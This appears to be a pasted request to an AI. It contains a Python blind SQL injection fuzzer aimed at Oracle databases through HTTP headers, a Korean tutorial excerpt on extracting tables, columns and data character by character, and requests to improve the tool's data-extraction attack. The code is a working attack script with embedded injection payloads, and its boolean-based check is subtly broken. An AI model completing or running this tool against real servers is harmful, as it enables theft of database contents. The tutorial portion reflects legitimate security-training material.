import csv
import os
from socket import (socket, AF_INET, SOCK_STREAM)
import gevent
import time
import sys
from datetime import datetime

class blindSeeker:
    def __init__(self, target_params, headerValue='fuzzer'):
        # 타겟 정보
        self.server = target_params['server']
        self.port = target_params['port']
        self.index = target_params['index']
        self.headersFile = target_params['headersFile']
        self.injectionFile = target_params['injectionFile']
        self.HTTPVerb = target_params['method']
        self.headerValue = headerValue
        self.delay = target_params['delay']
        self.max_retries = target_params['retries']
        self.discover_vuln = []  # 성공한 인젝션 데이터
        self.failed_vuln = []    # 실패한 인젝션 데이터
        self.table_structure = [] # 테이블 및 컬럼 정보 저장
        self.threshold = 0.5     # 응답 시간 기준 (초 단위)
        
        # 파일이 없을 경우 자동으로 생성
        self.ensure_files_exist()

    def ensure_files_exist(self):
        '''필요한 경로와 파일을 생성하고 기본 내용을 추가합니다.'''
        if not os.path.exists(self.headersFile):
            os.makedirs(os.path.dirname(self.headersFile), exist_ok=True)
            with open(self.headersFile, 'w', encoding='utf-8') as f:
                f.write("User-Agent: Mozilla/5.0\nAccept: */*\n")  # 기본 헤더 추가
            print(f"기본 헤더 파일이 생성되었습니다: {self.headersFile}")

        if not os.path.exists(self.injectionFile):
            os.makedirs(os.path.dirname(self.injectionFile), exist_ok=True)
            with open(self.injectionFile, 'w', encoding='utf-8') as f:
                # 다양한 테이블 및 컬럼 추출용 페이로드 추가
                f.write("' UNION SELECT table_name, column_name FROM all_tab_columns WHERE ROWNUM = 1--\n")
                f.write("' UNION SELECT table_name, 'dummy' FROM all_tables WHERE ROWNUM = 1--\n")
                f.write("' UNION SELECT table_name, column_name FROM user_tab_columns WHERE ROWNUM = 1--\n")
                f.write("' UNION SELECT table_name, 'dummy' FROM user_tables WHERE ROWNUM = 1--\n")
                f.write("' OR 1=1--\n' OR 'a'='a\n' UNION SELECT NULL, NULL--\n")  # 일반 페이로드 추가
            print(f"기본 페이로드 파일이 생성되었습니다: {self.injectionFile}")

    def baseline(self):
        '''서버의 기본 응답 시간을 측정합니다.'''
        try:
            s = socket(AF_INET, SOCK_STREAM)
            s.connect((self.server, self.port))
            data = f"{self.HTTPVerb} / HTTP/1.1\r\nHost: {self.server}\r\nConnection: close\r\n\r\n"
            t1 = time.time()
            s.send(data.encode())
            s.recv(100)
            t2 = time.time()
            return t2 - t1
        except Exception as err:
            print("기본 응답 시간 측정 실패:", err)
            sys.exit()

    def discover(self, target, counter, injection_type):
        '''SQL 인젝션 유형별 수행 및 결과 기록'''
        vulnHeader = target['vulnHeader']
        sqlInjection = target['sqlInjection']
        baseIndex = self.baseline()

        try:
            s = socket(AF_INET, SOCK_STREAM)
            s.connect((self.server, self.port))
            injection = sqlInjection.replace("*index*", str(self.index))
            data = f"{self.HTTPVerb} / HTTP/1.1\r\nHost: {self.server}\r\n{vulnHeader}: {self.headerValue}{injection}\r\nConnection: close\r\n\r\n"
            t1 = time.time()
            s.send(data.encode())
            response = s.recv(4096)
            t2 = time.time()
            record = t2 - t1

            # 테이블 및 컬럼 구조 추출 (데이터베이스 구조 탐색용 페이로드)
            if "table_name" in sqlInjection and "column_name" in sqlInjection:
                if any(keyword in response.decode('utf-8', errors='ignore') for keyword in ["table_name", "column_name"]):
                    print(f"[!] 테스트 {counter}: 테이블 및 컬럼 구조 추출 성공")
                    self.table_structure.append(["테이블 및 컬럼 추출", injection, "구조 추출 성공"])
                else:
                    print(f"[X] 테스트 {counter}: 테이블 및 컬럼 구조 추출 실패")

            # 타임 기반 인젝션 판별
            elif injection_type == "time":
                if record > (baseIndex + self.threshold):
                    print(f"[!] 테스트 {counter}: 타임 기반 인젝션 성공. 응답 시간: {record:.2f}초")
                    self.discover_vuln.append(["타임 기반", injection, f"{record:.2f}초"])
                else:
                    self.failed_vuln.append(["타임 기반", injection, f"{record:.2f}초"])

            # Boolean 기반 인젝션 판별
            elif injection_type == "boolean":
                true_injection = sqlInjection.replace("*index*", "1=1")  # 참 조건
                false_injection = sqlInjection.replace("*index*", "1=2")  # 거짓 조건
                s.send(true_injection.encode())
                true_response = s.recv(4096)
                s.send(false_injection.encode())
                false_response = s.recv(4096)
                if true_response != false_response:
                    print(f"[!] 테스트 {counter}: Boolean 기반 인젝션 성공")
                    self.discover_vuln.append(["Boolean 기반", injection, "응답 차이 발생"])
                else:
                    self.failed_vuln.append(["Boolean 기반", injection, "응답 차이 없음"])

            # Error 기반 인젝션 판별
            elif injection_type == "error":
                if any(keyword in response.decode('utf-8', errors='ignore') for keyword in ["error", "syntax"]):
                    print(f"[!] 테스트 {counter}: Error 기반 인젝션 성공")
                    self.discover_vuln.append(["Error 기반", injection, "오류 메시지 발생"])
                else:
                    self.failed_vuln.append(["Error 기반", injection, "오류 메시지 없음"])

            else:
                print(f"[X] 테스트 {counter}: 인젝션 실패. 응답 시간: {record:.2f}초, 기준 시간: {baseIndex + self.threshold:.2f}초")
                self.failed_vuln.append([injection_type, injection, f"{record:.2f}초"])

        except Exception as err:
            print(f"서버에 대한 공격 실패: {err}")
            sys.exit()

    def fuzz(self):
        '''SQL 인젝션 fuzzing 시작 및 결과 출력'''
        counter = 1
        baseIndex = self.baseline()
        print(f"서버 {self.server}의 기본 응답 시간 기록: {baseIndex:.2f}초\n")

        threads = []
        with open(self.headersFile) as Header_Requests:
            for Header in Header_Requests:
                with open(self.injectionFile) as injectionFile:
                    for Injection in injectionFile:
                        target = {
                            'vulnHeader': Header.strip(),
                            'sqlInjection': Injection.strip()
                        }
                        # 세 가지 인젝션 유형에 대해 테스트
                        for injection_type in ["time", "boolean", "error"]:
                            threads.append(gevent.spawn(self.discover, target, counter, injection_type))
                            counter += 1

        gevent.joinall(threads)

        # 발견된 취약점 출력 및 CSV 저장
        if self.discover_vuln or self.failed_vuln or self.table_structure:
            print("발견된 취약점 목록:")
            for result in self.discover_vuln:
                print(result)
            for fail_result in self.failed_vuln:
                print(fail_result)
            self.save_to_csv()
        else:
            print("취약점이 발견되지 않았습니다.")

    def save_to_csv(self):
        '''성공한 인젝션, 실패한 인젝션 및 테이블 구조를 CSV 파일에 저장'''
        filename = f"injection_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        try:
            with open(filename, mode='w', newline='', encoding='utf-8-sig') as file:
                writer = csv.writer(file)
                writer.writerow(["성공한 인젝션"])
                writer.writerow(["인젝션 유형", "페이로드", "결과"])
                writer.writerows(self.discover_vuln)  # 성공한 인젝션 기록
                writer.writerow([])
                writer.writerow(["실패한 인젝션"])
                writer.writerow(["인젝션 유형", "페이로드", "결과"])
                writer.writerows(self.failed_vuln)  # 실패한 인젝션 기록
                writer.writerow([])
                writer.writerow(["테이블 및 컬럼 구조"])
                writer.writerow(["인젝션 유형", "페이로드", "결과"])
                writer.writerows(self.table_structure)  # 테이블 및 컬럼 구조
            print(f"성공, 실패 데이터 및 테이블 구조가 {filename} 파일에 저장되었습니다.")
        except PermissionError:
            print("파일 저장 중 권한 오류가 발생했습니다. 파일을 닫고 다시 시도하십시오.")

# 실제 공격 대상 파라미터
target_params = {
    'server': 'localhost',  # 'http://' 부분 제거
    'port': 8080,
    'index': 1,
    'headersFile': 'fuzz-data/headers/default_headers.txt',
    'injectionFile': 'fuzz-data/payloads/oracle_time.txt',
    'method': 'GET',
    'delay': 1,
    'retries': 5
}

# blindSeeker 객체 생성 및 fuzzing 실행
if __name__ == "__main__":
    try:
        vulns = blindSeeker(target_params)
        print("DBMS에서 블라인드 SQL 인젝션 공격을 시작합니다...")
        vulns.fuzz()
        print("블라인드 SQL 인젝션 공격이 완료되었습니다.")
    except Exception as e:
        print("오류 발생:", e)


■ Blind SQL Injection

Blind SQL Injection은 참(True)인 쿼리문과 거짓(False)인 쿼리문 입력 시 반환되는 서버의 응답이 다른 것을 이용하여 이를 비교하여 데이터를 추출하는 공격이다. Blind SQL Injection은 다른 유형의 SQL Injection과 달리 추출하려는 실제 데이터가 눈에 보이지 않는다. 따라서 참 또는 거짓의 입력값에 따른 서버의 응답을 통해 값을 유추해야 한다. 

.

아래의 그림은 게시판의 검색 기능에서 Blind SQL Injection 취약점 여부를 확인한 결과이다. 참인 쿼리문을 입력할 경우 검색 결과가 출력되고, 거짓인 쿼리문을 입력할 경우 검색 결과가 표시되지 않는다.

.

1) 입력값이 참인 경우


2) 입력값이 거짓인 경우


이처럼 참 또는 거짓의 입력값에 대한 서버의 응답이 다를 때 Blind SQL Injection이 가능하다.

.

Blind SQL Injection의 공격 과정은 테이블 목록화 → 컬럼 목록화 → 데이터 목록화 순으로 이뤄지며, 각 단계는 아래의 과정을 반복적으로 수행한다.


[데이터 추출 과정 예시]

※ 참 또는 거짓의 입력값에 대한 서버의 응답을 확인할 수 없을 때, 특정 시간 동안 응답을 지연시키는 방법으로 데이터를 추출하는 방법도 있다. 이를 Time Based SQL Injection이라고 한다.

.

.

■ 공격 진행에 앞서

1. SUBSTR함수 - 문자열 자르기

Blind SQL Injection은 문자열에 대한 특정 위치의 문자를 확인할 수 있다. 이때 문자열을 자르는 함수인 SUBSTR함수를 사용하며, 예시는 다음과 같다.


※ MySQL, MS-SQL의 경우 SUBSTRING 함수를 사용한다.

.

2. ASCII함수 - 문자를 숫자로 변환하기

SUBSTR함수를 통해 문자열 중 1개의 문자를 출력한 후, 조건문에서 값을 비교하기 위해 논리형 자료로 가공한다. 추출한 문자를 숫자로 변환[1] 하여 범위를 설정해 값을 유추하면 비교 연산을 쉽게 진행할 수 있다. 이때 문자를 ASCII(숫자, 10진수) 형태로 변환하는 ASCII함수를 사용하여 ASCII 값과 비교를 통해 문자를 추적할 수 있다.

​

[1] 비교하는 두 데이터의 형식이 일치하지 않을 경우 'ORA-01722: invalid number' 에러가 발생한다.


문자열 'eqst'의 첫 번째 문자인 'e'를 ASCII함수로 변환하고, 참 또는 거짓인 조건문에 대한 출력 결과는 다음과 같다.


.

.

■ 공격 진행 과정

Blind SQL Injection의 공격 진행 과정은 다음과 같다.


[Blind SQL Injection 진행 과정]

Step 1. 취약점 존재 여부 확인

사용자 입력값을 결과로 출력해 주는 게시판의 검색 기능에서 SQL Injection 취약점 존재 여부를 확인한다. SQL구문에서 문법적 요소로 작용하는 싱글쿼터(') 등과 같은 특수문자를 입력하여 입력했을 때 서버의 반응을 보고 취약점 존재 여부를 판단할 수 있다.

.

Step 2. Blind SQL Injection

Blind SQL Injection은 참과 거짓의 논리를 통해 공격이 진행된다. 각 테이블/컬럼/데이터의 전체 개수를 확인하고 SUBSTR함수를 사용해 각 테이블/컬럼/데이터의 문자를 1개씩 추출한다. 추출한 문자를 ASCII 함수를 사용해 숫자로 변환하여 비교 연산을 통해 문자를 확인한다. 행 번호와 자릿수를 증가시켜가며 문자열을 추적하는 과정을 반복하면 원하는 데이터를 추출할 수 있다. 

2-1) 테이블 정보 확인

원하는 데이터를 추출하기 위해 전체 테이블 개수를 확인해야 한다. 실습에서는 user_tables를 통해 사용자가 생성한 전체 테이블 개수를 조회한다.



테이블의 개수를 확인한 후 원하는 테이블을 찾을 때까지 행 번호와 자릿수를 증가시켜가며 테이블명을 추출한다.




위의 과정을 반복하여 추출한 사용자 생성 테이블 목록 중 1번째 테이블의 이름은 'MEMBER'이다.

.

2-2) 컬럼 정보 확인

원하는 테이블의 컬럼 정보를 확인하기 위해 앞서 획득한 'MEMBER' 테이블의 전체 컬럼 수를 추출한다.




위의 과정을 반복하여 추출한 MEMBER 테이블의 1번째 컬럼명은 'USERID'이다.

.

2-3) 데이터 정보 확인

MEMBER 테이블의 USERID 컬럼의 데이터를 추출하기 위해 해당 테이블의 데이터 개수를 확인한다.



MEMBER 테이블의 전체 데이터 개수 확인 후 원하는 데이터를 찾을 때까지 행 번호와 자릿수를 증가시켜가며 데이터를 추출한다.




위의 과정을 반복하여 추출한 MEMBER 테이블의 1번째 USERID의 값은 'admin'이다.

.

Step 3. 원하는 데이터 탈취

이처럼 참 또는 거짓의 쿼리에 대한 서버 측의 응답을 통해 전체 테이블/컬럼/데이터의 개수를 확인하여 원하는 데이터의 문자열을 1개씩 추출한다. 추출한 문자를 비교 연산을 통해 데이터를 유추하여 데이터베이스의 모든 데이터 추출이 가능하다.

.

Blind SQL Injection은 과정이 반복되는 만큼 자동화된 스크립트를 사용하는 것이 일반적이다. 또한 많은 양의 로그를 유발하므로 공격 횟수를 최소화하여 진행해야 한다. 
[출처] [Special Report] 웹 취약점과 해킹 매커니즘 #5 Blind SQL Injection|작성자 SK쉴더스
블라인드 sql 인젝션 분기문 만들어서 더 자세하게

오라클 DBMS 데이터 추출을 위한 자동화 스크립트(python 기반) 제작 및 공격 진행
- 공격 속도 최적화를 위한 알고리즘 개선 및 PoC 과정 기술

공격은 성곡했는데 데이터 추출이 안됨

피드백 바탕으로 코드 수정해주고, 출력값은 한국어로